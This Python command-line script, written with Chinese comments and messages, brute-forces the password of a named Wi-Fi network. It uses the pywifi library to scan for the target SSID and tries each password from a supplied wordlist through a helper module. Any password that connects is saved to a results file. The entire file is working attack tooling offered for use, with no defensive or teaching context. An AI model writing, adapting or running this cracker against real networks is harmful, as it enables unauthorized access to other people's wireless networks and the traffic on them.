#! /usr/bin/python3

import os

import pywifi
from pywifi import const  # 引用一些定义
from tqdm import tqdm

from cracker_util import get_aps, crack_ap, sample_passwords


def main(password_file, ssid, result_file='results.txt', stype=0):
    if not os.path.isfile(password_file):
        print('[!]密码本文件不存在')
        return

    print('[+]获取网卡')
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    iface = wifi.interfaces()[0]  # 获取网卡，对于wifi连接服务，默认为0号网卡
    print('[-]成功获取网卡')

    if ssid in [profile.ssid for profile in iface.network_profiles()]:
        print('[*]此(SSID:%s)已经存在电脑中' % ssid)
        return

    print('[+]导入密码本')
    passwords = []
    with open(password_file) as f:
        for line in f:
            passwords.append(line.strip('\n'))
    print('[-]成功导入密码本')

    print('[+]扫描热点')
    for profile in get_aps(iface):
        if profile.ssid == ssid:
            break
    else:
        print('[!]%s不在当前区域' % ssid)
        return
    print('[-]完成扫描')

    print('[+]开始破解SSID:', ssid)

    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型

    for key in tqdm(sample_passwords(passwords, stype), desc='Passwords'):
        profile.key = key
        if crack_ap(iface, profile):
            with open(result_file, 'a') as f:
                f.write('%s : %s\n' % (ssid, key))
            print('[*]使用密码 %s 破解 %s成功' % (key, ssid))
            break

    print('[-]结束破解SSID:', profile.ssid)


def __main__():
    import argparse

    parser = argparse.ArgumentParser(description='暴力破解指定SSID的热点')
    parser.add_argument('password_file', type=str, help='密码本文件')
    parser.add_argument('ssid', type=str, help='所要破解的 SSID 名称')
    parser.add_argument('--result_file', type=str,
                        default='results.txt', help='保存所有热点密码结果文件，默认为results.txt')
    parser.add_argument('-s', '--stype', type=int, default=0,
                        help=sample_passwords.__doc__+'，默认为0')
    args = parser.parse_args()

    main(args.password_file, args.ssid, args.result_file, args.stype)


if __name__ == '__main__':
    __main__()
